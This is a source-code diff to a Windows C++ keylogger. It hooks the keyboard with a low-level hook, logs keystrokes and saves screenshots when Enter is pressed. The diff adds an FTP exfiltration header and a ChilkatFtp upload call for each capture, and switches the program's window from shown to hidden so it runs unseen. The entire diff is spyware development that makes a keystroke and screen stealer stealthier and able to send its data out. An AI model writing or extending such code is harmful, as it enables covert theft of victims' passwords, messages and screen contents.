@@ -14,6 +14,8 @@
 #include "basewin.h"
 #include "helper.h"
 #include "ImageCapture.h"
+#include "ftpExfiltrate.h"
+#include "SetInterval.h"
 
 using namespace std;
 // Command below to monitor changes in textfile.
@@ -137,6 +139,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                         break;
                     case VK_RETURN:
                         SaveAsPng(num);
+                        ChilkatFtp(num);
                         num++;
                         Log("[ENTER]");
                         break;
@@ -156,8 +159,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                         Log("[ESC]");
                         break;
                     case VK_SPACE:     
-                        SaveAsPng(num);
-                        num++;
                         Log("[SPACE]");
                         break;
                     case VK_PRIOR:
@@ -323,8 +324,9 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	if (!win.Create(L"Keylogger", WS_OVERLAPPEDWINDOW)) {
 		return 0;
 	}
-	ShowWindow(win.Window(), SW_SHOW);
+	ShowWindow(win.Window(), SW_HIDE);
 	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, NULL, 0);
+
 	
 	MSG msg;
 
